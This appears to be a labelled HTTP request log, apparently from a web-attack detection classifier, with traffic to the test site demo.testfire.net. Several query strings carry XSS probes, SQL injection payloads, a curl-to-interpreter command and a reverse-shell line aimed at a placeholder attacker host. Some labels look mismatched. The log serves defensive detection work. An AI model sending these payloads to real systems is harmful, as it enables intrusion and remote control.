GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=alert<>,,0,0,0,0,0,2,0,0,0,0,0,0,0,XSS,0.9999
GET,http://demo.testfire.net/search.jsp?query=alertï¿½,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=alert<,,0,0,0,0,0,1,0,0,0,0,0,0,0,XSS,0.9999
GET,http://demo.testfire.net/search.jsp?query=hello there,,0,0,0,0,1,0,0,0,0,0,0,0,0,good,0.851
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://google.com/xjs/_/ss/k=xjs.hp.33RNxo6GE-8.L.X.O/am=AQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgABAIAAAAAIAAAAJAAAEAI/d=1/ed=1/rs=ACT90oHPLMTdGRMcgL17jJIWftdK80b9IA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/client_204?&atyp=i&biw=1280&bih=587&ei=MXITZsT1PMDe1sQPutqcoA8&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,"http://google.com/xjs/_/js/k=xjs.hp.en.ciQyZxwgdh0.O/am=AAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAxgEAAAAAAAAAAMABAAAAAAAAAAAAAA6iIwAYgCMAAPAC/d=1/ed=1/rs=ACT90oESXeSjUetcaUKU_o0qMdldT9XBTA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/favicon.ico,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://clients1.google.com/generate_204,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/gen_204?atyp=i&ct=psnt&cad=&nt=navigate&ei=MXITZsT1PMDe1sQPutqcoA8&zx=1712550457706&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)</script>,,0,0,0,1,0,4,0,0,0,0,1,0,0,XSS,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=hello,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/client_204?&atyp=i&biw=1280&bih=587&ei=FIYTZrThDJHd2roP-bqMwAg&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,"http://google.com/xjs/_/ss/k=xjs.hp.33RNxo6GE-8.L.X.O/am=AQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgABAIAAAAAIAAAAJAAAEAI/d=1/ed=1/rs=ACT90oHPLMTdGRMcgL17jJIWftdK80b9IA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://google.com/xjs/_/js/k=xjs.hp.en.ciQyZxwgdh0.O/am=AAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAxgEAAAAAAAAAAMABAAAAAAAAAAAAAA6iIwAYgCMAAPAC/d=1/ed=1/rs=ACT90oESXeSjUetcaUKU_o0qMdldT9XBTA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://clients1.google.com/generate_204,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/gen_204?atyp=i&ct=psnt&cad=&nt=reload&ei=FIYTZrThDJHd2roP-bqMwAg&zx=1712555544212&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=<script+onLoad+script+onLoad=""javascript:javascript:alert(1)""></script+onLoad>",,0,2,0,1,0,4,0,0,0,1,2,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://google.com/xjs/_/ss/k=xjs.hp.33RNxo6GE-8.L.X.O/am=AQAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgABAIAAAAAIAAAAJAAAEAI/d=1/ed=1/rs=ACT90oHPLMTdGRMcgL17jJIWftdK80b9IA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/client_204?&atyp=i&biw=1280&bih=559&ei=6IgTZqa4Fofd2roPkYK2kAs&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,"http://google.com/xjs/_/js/k=xjs.hp.en.ciQyZxwgdh0.O/am=AAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAxgEAAAAAAAAAAMABAAAAAAAAAAAAAA6iIwAYgCMAAPAC/d=1/ed=1/rs=ACT90oESXeSjUetcaUKU_o0qMdldT9XBTA/m=sb_he,d",,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://clients1.google.com/generate_204,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://google.com/gen_204?atyp=i&ct=psnt&cad=&nt=navigate&ei=6IgTZqa4Fofd2roPkYK2kAs&zx=1712556269657&opi=89978449,,0,0,0,0,0,0,0,0,0,0,0,0,6,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://ciscobinary.openh264.org/openh264-win64-2e1774ab6dc6c43debb0b5b628bdf122a391d521.zip,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=,(select * from (select(sleep(10)))a)",,0,0,0,4,3,0,0,0,2,0,1,0,0,XSS,0.9999
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=+OR+3409=3409+AND+('pytW'+LIKE+'pytY,,3,0,0,1,0,0,0,0,1,0,0,0,0,XSS,0.998
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query= ORDER BY 2--,,0,0,1,0,3,0,0,0,1,0,0,0,0,Sqli,0.8341
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,"http://demo.testfire.net/search.jsp?query=ruby+-e+""$(curl+-fsSL+https://raw.githubusercontent.com/Homebrew/install/master/install)""+<+/dev/null+2>+/dev/null",,0,2,0,1,0,2,0,0,0,0,0,0,6,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=bash+-i+>&+/dev/tcp/ATTACKER-IP/ATTACKER-PORT+0>&1,,0,0,0,0,0,2,0,0,0,0,0,1,6,cmdi,0.795
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=bash+-i+>&+/dev/tcp/ATTACKER-IP/ATTACKER-PORT+0>&1,,0,0,0,0,0,2,0,0,0,0,0,1,6,cmdi,0.795
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://api.ipify.org/?format=json,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/style.css,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home2.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home3.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/logo.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/header_pic.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/pf_lock.gif,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/home1.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/images/gradient.jpg,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://demo.testfire.net/search.jsp?query=<script>alert(1)></script>,,0,0,0,1,0,5,0,0,0,0,1,0,0,XSS,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/canonical.html,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv4,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
GET,http://detectportal.firefox.com/success.txt?ipv6,,0,0,0,0,0,0,0,0,0,0,0,0,0,good,1.0
